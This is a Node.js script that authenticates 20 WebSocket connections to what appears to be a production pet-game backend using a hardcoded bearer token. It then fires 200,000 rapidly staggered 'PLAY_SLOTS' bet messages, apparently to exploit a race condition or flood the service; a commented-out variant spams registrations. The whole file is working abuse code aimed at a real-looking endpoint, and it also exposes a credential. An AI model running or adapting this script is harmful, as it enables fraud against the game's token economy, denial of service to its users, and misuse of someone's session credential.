import WebSocket from "ws";
import { v4 as uuidv4 } from "uuid";

const endpoint = "wss://petbot-monorepo-websocket-333713154917.europe-west1.run.app/";
const jwt = "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlU3bU9NMzBNZGJRY3RQMmdoWE4wU0dhTDFIWjNSUWVoZWxkZUNHNF9OaWsifQ.eyJzaWQiOiJjbWY4OWpieG0wMDJ2a3kwYnF2aHltZnh0IiwiaXNzIjoicHJpdnkuaW8iLCJpYXQiOjE3NTcxNzAxNjUsImF1ZCI6ImNtN2dldjVzNjAwdmJrMmxzajZlMWU5ZzciLCJzdWIiOiJkaWQ6cHJpdnk6Y21mODlqYnoxMDAyeGt5MGIzZ3NhOHhhYyIsImV4cCI6MTc1NzE3Mzc2NX0.7dPG8eflGl6FjBJeMc8zktXe0f2x7B2DpItaH8xTvziUB72FG3BLuFhjCcSLEtexuKjulHaym-HM3qAxtD3PMA";
const origin = "https://app.pett.ai";

const pettName = "aocontinues_rs_019";

const connections = 20;
const messagesPerSocket = 10000;

let sockets = [];
let readyCount = 0;

function buildAuthMessage() {
  return {
    type: "AUTH",
    data: { params: { authType: "privy", authHash: { hash: jwt } } },
    nonce: uuidv4(),
  };
}

// function buildSpamMessage() {
//   return {
//     type: "REGISTER",
//     data: {
//       params: { authType: "privy", registerHash: { hash: jwt, name: pettName } },
//     },
//     nonce: uuidv4(),
//   };
// }

function buildSpamMessage() {
    return {
        type: "PLAY_SLOTS",
        data: {
            params: {
                betAmount: 500
            }
        },
        nonce: uuidv4()
    };
}

// Burst with micro staggering
function sendBurst() {
  const total = connections * messagesPerSocket;
  console.log(`🚀 Sending burst of ${total} messages`);

  sockets.forEach((sock, idx) => {
    for (let i = 0; i < messagesPerSocket; i++) {
      const delay = i * 2; // 2ms spacing per message
      setTimeout(() => {
        if (sock.readyState === WebSocket.OPEN) {
          sock.send(JSON.stringify(buildSpamMessage()));
        }
      }, delay);
    }
  });
}

function connectSocket(index) {
  return new Promise((resolve) => {
    const ws = new WebSocket(endpoint, { headers: { Origin: origin } });

    ws.on("open", () => {
      ws.send(JSON.stringify(buildAuthMessage()));
    });

    ws.on("message", (data) => {
      try {
        const msg = JSON.parse(data.toString());
        if (msg.type === "auth_result") {
          console.log(`✅ Socket ${index + 1} authenticated`);
          console.log(`Tokens = ${Math.round(Number(msg?.pet?.PetTokens?.tokens) / Number(1000000000000000000))}, Error = ${msg?.error}`);
          sockets.push(ws);
          readyCount++;
          resolve();
        } else {
            console.log(msg)
        }
      } catch (e) {
        console.error("Parse error:", e);
      }
    });

    ws.on("error", (err) => {
      console.error(`❌ Socket ${index + 1} error:`, err.message);
    });
  });
}

async function main() {
  console.log(`🔌 Opening ${connections} sockets...`);
  for (let i = 0; i < connections; i++) {
    await connectSocket(i);
  }

  console.log(`🎉 All ${readyCount} sockets authenticated`);
  sendBurst();
}

main();
